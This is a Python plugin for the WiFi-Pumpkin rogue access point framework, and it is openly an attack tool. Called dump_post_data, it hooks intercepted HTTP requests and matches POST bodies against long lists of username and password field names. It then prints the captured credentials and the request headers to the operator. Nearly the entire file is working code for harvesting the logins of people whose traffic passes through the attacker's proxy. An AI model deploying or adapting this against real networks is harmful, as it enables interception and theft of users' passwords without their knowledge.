from plugins.extension.plugin import PluginTemplate
from mitmproxy.models import decoded
from PyQt4.QtCore import QObject,pyqtSignal
import re

"""
Description:
    This program is a core for wifi-pumpkin.py. file which includes functionality
    plugins for Pumpkin-Proxy.

Copyright:
    Copyright (C) 2015-2016 Marcos Nesster P0cl4bs Team
    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>
"""

class dump_post_data(PluginTemplate):
    meta = {
        'Name'      : 'dump_post_data',
        'Version'   : '1.0',
        'Description' : 'Getting HTTP post data capture login post and logout pre event hook and its its working in web',
        'Author'    : 'Marcos Nesster'
    }
    def __init__(self):
        for key,value in self.meta.items():
            self.__dict__[key] = value
        self.ConfigParser = False

    def get_password_POST(self, content):
        user = None
        passwd = None

        # Taken mainly from Pcredz by Laurent Gaffie
        userfields = ['log','login', 'wpname', 'ahd_username', 'unickname', 'nickname', 'user', 'user_name',
                      'alias', 'pseudo', 'email', 'username', '_username', 'userid', 'form_loginname', 'loginname',
                      'login_id', 'loginid', 'session_key', 'sessionkey', 'pop_login', 'uid', 'id', 'user_id', 'screename',
                      'uname', 'ulogin', 'acctname', 'account', 'member', 'mailaddress', 'membername', 'login_username',
                      'login_email', 'loginusername', 'loginemail', 'uin', 'sign-in']
        passfields = ['ahd_password', 'pass', 'password', '_password', 'passwd', 'session_password', 'sessionpassword',
                      'login_password', 'loginpassword', 'form_pw', 'pw', 'userpassword', 'pwd', 'upassword', 'login_password'
                      'passwort', 'passwrd', 'wppassword', 'upasswd']

        for login in userfields:
            login_re = re.search('(%s=[^&]+)' % login, content, re.IGNORECASE)
            if login_re:
                user = login_re.group()
        for passfield in passfields:
            pass_re = re.search('(%s=[^&]+)' % passfield, content, re.IGNORECASE)
            if pass_re:
                passwd = pass_re.group()

        if user and passwd:
            return (user, passwd)

    def request(self, flow):
        self.send_output.emit("FOR: " + flow.request.url +" "+ flow.request.method + " " + flow.request.path + " " + flow.request.http_version)
        with decoded(flow.request):
            user_passwd = self.get_password_POST(flow.request.content)
            if user_passwd != None:
                try:
                    http_user = user_passwd[0].decode('utf8')
                    http_pass = user_passwd[1].decode('utf8')
                    # Set a limit on how long they can be prevent false+
                    if len(http_user) > 75 or len(http_pass) > 75:
                        return
                    self.send_output.emit("\n[{}][HTTP REQUEST HEADERS]\n".format(self.Name))
                    for name, valur in flow.request.headers.iteritems():
                        self.send_output.emit('{}: {}'.format(name,valur))
                    self.send_output.emit( 'HTTP username: %s' % http_user)
                    self.send_output.emit( 'HTTP password: %s\n' % http_pass)
                except UnicodeDecodeError:
                    pass

    def response(self, flow):
        pass